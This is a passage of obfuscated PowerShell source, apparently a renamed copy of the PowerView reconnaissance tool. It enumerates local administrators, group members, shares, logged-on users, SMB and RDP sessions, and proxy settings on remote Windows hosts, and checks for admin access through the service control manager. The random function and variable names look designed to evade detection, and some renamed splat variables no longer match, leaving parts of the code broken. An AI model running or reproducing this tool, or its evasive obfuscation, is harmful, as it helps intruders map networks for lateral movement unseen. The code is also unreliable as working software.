            $dJmldfHB99 = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $mCwgcTgn99 =  @{
                'GptTmplPath' = $dJmldfHB99
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $mCwgcTgn99['Credential'] = $ZiReXCQu99 }

            lunar @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                $_
            }
        }
    }
}



function conferring {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = $Env:COMPUTERNAME,

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $RotDAwGI99 = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
        }
    }

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {
            if ($RotDAwGI99 -eq 'API') {

                $SzsvPONr99 = 1
                $mAzkenkf99 = [IntPtr]::Zero
                $SJyyzfGm99 = 0
                $baifGZZB99 = 0
                $sPUxXsLm99 = 0

                $BSvRtRei99 = $lXLOcMXI99::NetLocalGroupEnum($LqojfQUN99, $SzsvPONr99, [ref]$mAzkenkf99, -1, [ref]$SJyyzfGm99, [ref]$baifGZZB99, [ref]$sPUxXsLm99)

                $edhaIdNu99 = $mAzkenkf99.ToInt64()

                if (($BSvRtRei99 -eq 0) -and ($edhaIdNu99 -gt 0)) {

                    $edZYFiQh99 = $puBxSgQL99::GetSize()

                    for ($i = 0; ($i -lt $SJyyzfGm99); $i++) {
                        $VhLegEcR99 = New-Object System.Intptr -ArgumentList $edhaIdNu99
                        $Info = $VhLegEcR99 -as $puBxSgQL99

                        $edhaIdNu99 = $VhLegEcR99.ToInt64()
                        $edhaIdNu99 += $edZYFiQh99

                        $hQyyeJwV99 = New-Object PSObject
                        $hQyyeJwV99 | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
                        $hQyyeJwV99 | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $hQyyeJwV99 | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $hQyyeJwV99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $hQyyeJwV99
                    }
                    $Null = $lXLOcMXI99::NetApiBufferFree($mAzkenkf99)
                }
                else {
                    Write-Verbose "[conferring] Error: $(([ComponentModel.Win32Exception] $BSvRtRei99).Message)"
                }
            }
            else {
                $vNtvAtTx99 = [ADSI]"WinNT://$LqojfQUN99,computer"

                $vNtvAtTx99.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $hQyyeJwV99 = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
                    $Group | Add-Member Noteproperty 'GroupName' ($hQyyeJwV99.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($hQyyeJwV99.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($hQyyeJwV99.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($glRtrabU99) {
            impregnates -LHlspMYk99 $glRtrabU99
        }
    }
}


function Mobutu {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = $Env:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $nVmmyinF99 = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $RotDAwGI99 = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
        }
    }

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {
            if ($RotDAwGI99 -eq 'API') {

                $SzsvPONr99 = 2
                $mAzkenkf99 = [IntPtr]::Zero
                $SJyyzfGm99 = 0
                $baifGZZB99 = 0
                $sPUxXsLm99 = 0

                $BSvRtRei99 = $lXLOcMXI99::NetLocalGroupGetMembers($LqojfQUN99, $nVmmyinF99, $SzsvPONr99, [ref]$mAzkenkf99, -1, [ref]$SJyyzfGm99, [ref]$baifGZZB99, [ref]$sPUxXsLm99)

                $edhaIdNu99 = $mAzkenkf99.ToInt64()

                $gFZrRmbI99 = @()

                if (($BSvRtRei99 -eq 0) -and ($edhaIdNu99 -gt 0)) {

                    $edZYFiQh99 = $hfwCzFNt99::GetSize()

                    for ($i = 0; ($i -lt $SJyyzfGm99); $i++) {
                        $VhLegEcR99 = New-Object System.Intptr -ArgumentList $edhaIdNu99
                        $Info = $VhLegEcR99 -as $hfwCzFNt99

                        $edhaIdNu99 = $VhLegEcR99.ToInt64()
                        $edhaIdNu99 += $edZYFiQh99

                        $TVijPzgJ99 = ''
                        $JPcMhfUd99 = $PLdufbge99::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$TVijPzgJ99);$BxwMoRfM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($JPcMhfUd99 -eq 0) {
                            Write-Verbose "[Mobutu] Error: $(([ComponentModel.Win32Exception] $BxwMoRfM99).Message)"
                        }
                        else {
                            $mNFtVFpM99 = New-Object PSObject
                            $mNFtVFpM99 | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
                            $mNFtVFpM99 | Add-Member Noteproperty 'GroupName' $nVmmyinF99
                            $mNFtVFpM99 | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $mNFtVFpM99 | Add-Member Noteproperty 'SID' $TVijPzgJ99
                            $JcwVjkwp99 = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $mNFtVFpM99 | Add-Member Noteproperty 'IsGroup' $JcwVjkwp99
                            $mNFtVFpM99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $gFZrRmbI99 += $mNFtVFpM99
                        }
                    }

                    $Null = $lXLOcMXI99::NetApiBufferFree($mAzkenkf99)

                    $XDnvGOEO99 = $gFZrRmbI99 | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($XDnvGOEO99) {
                        $XDnvGOEO99 = $XDnvGOEO99.Substring(0, $XDnvGOEO99.LastIndexOf('-'))

                        $gFZrRmbI99 | ForEach-Object {
                            if ($_.SID -match $XDnvGOEO99) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $gFZrRmbI99 | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $gFZrRmbI99
                }
                else {
                    Write-Verbose "[Mobutu] Error: $(([ComponentModel.Win32Exception] $BSvRtRei99).Message)"
                }
            }
            else {
                try {
                    $CgxLwXFa99 = [ADSI]"WinNT://$LqojfQUN99/$nVmmyinF99,group"

                    $CgxLwXFa99.psbase.Invoke('Members') | ForEach-Object {

                        $mNFtVFpM99 = New-Object PSObject
                        $mNFtVFpM99 | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
                        $mNFtVFpM99 | Add-Member Noteproperty 'GroupName' $nVmmyinF99

                        $XllbXHMH99 = ([ADSI]$_)
                        $urrFQjbw99 = $XllbXHMH99.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $JcwVjkwp99 = ($XllbXHMH99.SchemaClassName -like 'group')

                        if(([regex]::Matches($urrFQjbw99, '/')).count -eq 1) {
                            $SWFCuWit99 = $True
                            $Name = $urrFQjbw99.Replace('/', '\')
                        }
                        else {
                            $SWFCuWit99 = $False
                            $Name = $urrFQjbw99.Substring($urrFQjbw99.IndexOf('/')+1).Replace('/', '\')
                        }

                        $mNFtVFpM99 | Add-Member Noteproperty 'AccountName' $Name
                        $mNFtVFpM99 | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($XllbXHMH99.InvokeGet('ObjectSID'),0)).Value)
                        $mNFtVFpM99 | Add-Member Noteproperty 'IsGroup' $JcwVjkwp99
                        $mNFtVFpM99 | Add-Member Noteproperty 'IsDomain' $SWFCuWit99




                        $mNFtVFpM99
                    }
                }
                catch {
                    Write-Verbose "[Mobutu] Error for $LqojfQUN99 : $_"
                }
            }
        }
    }
    
    END {
        if ($glRtrabU99) {
            impregnates -LHlspMYk99 $glRtrabU99
        }
    }
}


function deferment {

    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
        }
    }

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {
            $SzsvPONr99 = 1
            $mAzkenkf99 = [IntPtr]::Zero
            $SJyyzfGm99 = 0
            $baifGZZB99 = 0
            $sPUxXsLm99 = 0

            $BSvRtRei99 = $lXLOcMXI99::NetShareEnum($LqojfQUN99, $SzsvPONr99, [ref]$mAzkenkf99, -1, [ref]$SJyyzfGm99, [ref]$baifGZZB99, [ref]$sPUxXsLm99)

            $edhaIdNu99 = $mAzkenkf99.ToInt64()

            if (($BSvRtRei99 -eq 0) -and ($edhaIdNu99 -gt 0)) {

                $edZYFiQh99 = $SDnRYmAJ99::GetSize()

                for ($i = 0; ($i -lt $SJyyzfGm99); $i++) {
                    $VhLegEcR99 = New-Object System.Intptr -ArgumentList $edhaIdNu99
                    $Info = $VhLegEcR99 -as $SDnRYmAJ99

                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $edhaIdNu99 = $VhLegEcR99.ToInt64()
                    $edhaIdNu99 += $edZYFiQh99
                    $Share
                }

                $Null = $lXLOcMXI99::NetApiBufferFree($mAzkenkf99)
            }
            else {
                Write-Verbose "[deferment] Error: $(([ComponentModel.Win32Exception] $BSvRtRei99).Message)"
            }
        }
    }

    END {
        if ($glRtrabU99) {
            impregnates -LHlspMYk99 $glRtrabU99
        }
    }
}


function carcinogens {

    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
        }
    }

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {
            $SzsvPONr99 = 1
            $mAzkenkf99 = [IntPtr]::Zero
            $SJyyzfGm99 = 0
            $baifGZZB99 = 0
            $sPUxXsLm99 = 0

            $BSvRtRei99 = $lXLOcMXI99::NetWkstaUserEnum($LqojfQUN99, $SzsvPONr99, [ref]$mAzkenkf99, -1, [ref]$SJyyzfGm99, [ref]$baifGZZB99, [ref]$sPUxXsLm99)

            $edhaIdNu99 = $mAzkenkf99.ToInt64()

            if (($BSvRtRei99 -eq 0) -and ($edhaIdNu99 -gt 0)) {

                $edZYFiQh99 = $zqkPfqMa99::GetSize()

                for ($i = 0; ($i -lt $SJyyzfGm99); $i++) {
                    $VhLegEcR99 = New-Object System.Intptr -ArgumentList $edhaIdNu99
                    $Info = $VhLegEcR99 -as $zqkPfqMa99

                    $MWzbSgCr99 = $Info | Select-Object *
                    $MWzbSgCr99 | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
                    $MWzbSgCr99.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $edhaIdNu99 = $VhLegEcR99.ToInt64()
                    $edhaIdNu99 += $edZYFiQh99
                    $MWzbSgCr99
                }

                $Null = $lXLOcMXI99::NetApiBufferFree($mAzkenkf99)
            }
            else {
                Write-Verbose "[carcinogens] Error: $(([ComponentModel.Win32Exception] $BSvRtRei99).Message)"
            }
        }
    }

    END {
        if ($glRtrabU99) {
            impregnates -LHlspMYk99 $glRtrabU99
        }
    }
}


function fenced {

    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
        }
    }

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {
            $SzsvPONr99 = 10
            $mAzkenkf99 = [IntPtr]::Zero
            $SJyyzfGm99 = 0
            $baifGZZB99 = 0
            $sPUxXsLm99 = 0

            $BSvRtRei99 = $lXLOcMXI99::NetSessionEnum($LqojfQUN99, '', $OpgheHcJ99, $SzsvPONr99, [ref]$mAzkenkf99, -1, [ref]$SJyyzfGm99, [ref]$baifGZZB99, [ref]$sPUxXsLm99)

            $edhaIdNu99 = $mAzkenkf99.ToInt64()

            if (($BSvRtRei99 -eq 0) -and ($edhaIdNu99 -gt 0)) {

                $edZYFiQh99 = $sUCccQvP99::GetSize()

                for ($i = 0; ($i -lt $SJyyzfGm99); $i++) {
                    $VhLegEcR99 = New-Object System.Intptr -ArgumentList $edhaIdNu99
                    $Info = $VhLegEcR99 -as $sUCccQvP99

                    $moUrjCze99 = $Info | Select-Object *
                    $moUrjCze99 | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
                    $moUrjCze99.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $edhaIdNu99 = $VhLegEcR99.ToInt64()
                    $edhaIdNu99 += $edZYFiQh99
                    $moUrjCze99
                }

                $Null = $lXLOcMXI99::NetApiBufferFree($mAzkenkf99)
            }
            else {
                Write-Verbose "[fenced] Error: $(([ComponentModel.Win32Exception] $BSvRtRei99).Message)"
            }
        }
    }


    END {
        if ($glRtrabU99) {
            impregnates -LHlspMYk99 $glRtrabU99
        }
    }
}


function hypodermic {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = 'localhost'
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
        }
    }

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {
            try {
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$wkNUqpQt99")

                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $OpgheHcJ99 = retrain -ObjectSID $_ -hKoxCyte99 'DomainSimple'

                    if ($OpgheHcJ99) {
                        $OpgheHcJ99, $tpoFORKS99 = $OpgheHcJ99.Split('@')
                    }
                    else {
                        $OpgheHcJ99 = $_
                        $tpoFORKS99 = $Null
                    }

                    $puhFfOCy99 = New-Object PSObject
                    $puhFfOCy99 | Add-Member Noteproperty 'ComputerName' "$wkNUqpQt99"
                    $puhFfOCy99 | Add-Member Noteproperty 'UserDomain' $tpoFORKS99
                    $puhFfOCy99 | Add-Member Noteproperty 'UserName' $OpgheHcJ99
                    $puhFfOCy99 | Add-Member Noteproperty 'UserSID' $_
                    $puhFfOCy99.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $puhFfOCy99
                }
            }
            catch {
                Write-Verbose "[hypodermic] Error opening remote registry on '$wkNUqpQt99' : $_"
            }
        }
    }

    END {
        if ($glRtrabU99) {
            impregnates -LHlspMYk99 $glRtrabU99
        }
    }
}


function mutinied {

    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
        }
    }

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {

            $KlAGKUfi99 = $keCFwkfG99::WTSOpenServerEx($LqojfQUN99)

            if ($KlAGKUfi99 -ne 0) {

                $KeaEFtLh99 = [IntPtr]::Zero
                $JPeHPnAb99 = 0

                $BSvRtRei99 = $keCFwkfG99::WTSEnumerateSessionsEx($KlAGKUfi99, [ref]1, 0, [ref]$KeaEFtLh99, [ref]$JPeHPnAb99);$BxwMoRfM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                $edhaIdNu99 = $KeaEFtLh99.ToInt64()

                if (($BSvRtRei99 -ne 0) -and ($edhaIdNu99 -gt 0)) {

                    $edZYFiQh99 = $wUHYqIqu99::GetSize()

                    for ($i = 0; ($i -lt $JPeHPnAb99); $i++) {

                        $VhLegEcR99 = New-Object System.Intptr -ArgumentList $edhaIdNu99
                        $Info = $VhLegEcR99 -as $wUHYqIqu99

                        $DSiymVMl99 = New-Object PSObject

                        if ($Info.pHostName) {
                            $DSiymVMl99 | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                        }
                        else {
                            $DSiymVMl99 | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
                        }

                        $DSiymVMl99 | Add-Member Noteproperty 'SessionName' $Info.pSessionName

                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            $DSiymVMl99 | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            $DSiymVMl99 | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        $DSiymVMl99 | Add-Member Noteproperty 'ID' $Info.SessionID
                        $DSiymVMl99 | Add-Member Noteproperty 'State' $Info.State

                        $eqrMrzZr99 = [IntPtr]::Zero
                        $RcxAWTqn99 = 0

                        $JPcMhfUd99 = $keCFwkfG99::WTSQuerySessionInformation($KlAGKUfi99, $Info.SessionID, 14, [ref]$eqrMrzZr99, [ref]$RcxAWTqn99);$CvIMZwFo99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($JPcMhfUd99 -eq 0) {
                            Write-Verbose "[mutinied] Error: $(([ComponentModel.Win32Exception] $CvIMZwFo99).Message)"
                        }
                        else {
                            $sYRZQNGm99 = $eqrMrzZr99.ToInt64()
                            $YbaazTdf99 = New-Object System.Intptr -ArgumentList $sYRZQNGm99
                            $Info2 = $YbaazTdf99 -as $iFVJfScA99

                            $iHLqvbAG99 = $Info2.Address
                            if ($iHLqvbAG99[2] -ne 0) {
                                $iHLqvbAG99 = [String]$iHLqvbAG99[2]+'.'+[String]$iHLqvbAG99[3]+'.'+[String]$iHLqvbAG99[4]+'.'+[String]$iHLqvbAG99[5]
                            }
                            else {
                                $iHLqvbAG99 = $Null
                            }

                            $DSiymVMl99 | Add-Member Noteproperty 'SourceIP' $iHLqvbAG99
                            $DSiymVMl99.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $DSiymVMl99

                            $Null = $keCFwkfG99::WTSFreeMemory($eqrMrzZr99)

                            $edhaIdNu99 += $edZYFiQh99
                        }
                    }
                    $Null = $keCFwkfG99::WTSFreeMemoryEx(2, $KeaEFtLh99, $JPeHPnAb99)
                }
                else {
                    Write-Verbose "[mutinied] Error: $(([ComponentModel.Win32Exception] $BxwMoRfM99).Message)"
                }
                $Null = $keCFwkfG99::WTSCloseServer($KlAGKUfi99)
            }
            else {
                Write-Verbose "[mutinied] Error opening the Remote Desktop Session Host (RD Session Host) server for: $wkNUqpQt99"
            }
        }
    }

    END {
        if ($glRtrabU99) {
            impregnates -LHlspMYk99 $glRtrabU99
        }
    }
}


function maimed {

    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
        }
    }

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {
            $KlAGKUfi99 = $PLdufbge99::OpenSCManagerW("\\$LqojfQUN99", 'ServicesActive', 0xF003F);$BxwMoRfM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            $zInKtnpm99 = New-Object PSObject
            $zInKtnpm99 | Add-Member Noteproperty 'ComputerName' $LqojfQUN99

            if ($KlAGKUfi99 -ne 0) {
                $Null = $PLdufbge99::CloseServiceHandle($KlAGKUfi99)
                $zInKtnpm99 | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[maimed] Error: $(([ComponentModel.Win32Exception] $BxwMoRfM99).Message)"
                $zInKtnpm99 | Add-Member Noteproperty 'IsAdmin' $False
            }
            $zInKtnpm99.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $zInKtnpm99
        }
    }

    END {
        if ($glRtrabU99) {
            impregnates -LHlspMYk99 $glRtrabU99
        }
    }
}


function cancer {

    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
        }
    }

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {
            if ($LqojfQUN99 -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $TCQcnJtN99 = $LqojfQUN99
                $LqojfQUN99 = [System.Net.Dns]::GetHostByAddress($LqojfQUN99) | Select-Object -ExpandProperty HostName
            }
            else {
                $TCQcnJtN99 = @(jocular -wkNUqpQt99 $LqojfQUN99)[0].IPAddress
            }

            $mAzkenkf99 = [IntPtr]::Zero

            $BSvRtRei99 = $lXLOcMXI99::DsGetSiteName($LqojfQUN99, [ref]$mAzkenkf99)

            $JGuggFFF99 = New-Object PSObject
            $JGuggFFF99 | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
            $JGuggFFF99 | Add-Member Noteproperty 'IPAddress' $TCQcnJtN99

            if ($BSvRtRei99 -eq 0) {
                $ZBmuuCEe99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($mAzkenkf99)
                $JGuggFFF99 | Add-Member Noteproperty 'SiteName' $ZBmuuCEe99
            }
            else {
                Write-Verbose "[cancer] Error: $(([ComponentModel.Win32Exception] $BSvRtRei99).Message)"
                $JGuggFFF99 | Add-Member Noteproperty 'SiteName' ''
            }
            $JGuggFFF99.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')

            $Null = $lXLOcMXI99::NetApiBufferFree($mAzkenkf99)

            $JGuggFFF99
        }
    }

    END {
        if ($glRtrabU99) {
            impregnates -LHlspMYk99 $glRtrabU99
        }
    }
}


function firmament {

    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = $Env:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {
            try {
                $PZIHGJhW99 = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $LqojfQUN99
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $PZIHGJhW99['Credential'] = $ZiReXCQu99 }

                $tngiSFjh99 = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'

                $HKCU = 2147483649
                $YMLDRRMC99 = $tngiSFjh99.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                $NNNqrKlJ99 = $tngiSFjh99.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue

                $Wpad = ''
                if ($NNNqrKlJ99 -and ($NNNqrKlJ99 -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($NNNqrKlJ99)
                    }
                    catch {
                        Write-Warning "[firmament] Error connecting to AutoConfigURL : $NNNqrKlJ99"
                    }
                }

                if ($YMLDRRMC99 -or $NNNqrKlJ99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
                    $Out | Add-Member Noteproperty 'ProxyServer' $YMLDRRMC99
                    $Out | Add-Member Noteproperty 'AutoConfigURL' $NNNqrKlJ99
                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $Out
                }
                else {
                    Write-Warning "[firmament] No proxy settings found for $wkNUqpQt99"
                }
            }
            catch {
                Write-Warning "[firmament] Error enumerating proxy settings for $wkNUqpQt99 : $_"
            }
        }
    }
}


function fasteners {

    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {
            $HKLM = 2147483650

            $PZIHGJhW99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $LqojfQUN99
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $PZIHGJhW99['Credential'] = $ZiReXCQu99 }

            try {
                $Reg = Get-WmiObject @WmiArguments

                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $FeXgnuvD99 = $Reg.GetStringValue($HKLM, $Key, $Value).sValue

                $GLYEpQbC99 = New-Object PSObject
                $GLYEpQbC99 | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
                $GLYEpQbC99 | Add-Member Noteproperty 'LastLoggedOn' $FeXgnuvD99
                $GLYEpQbC99.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $GLYEpQbC99
            }
            catch {
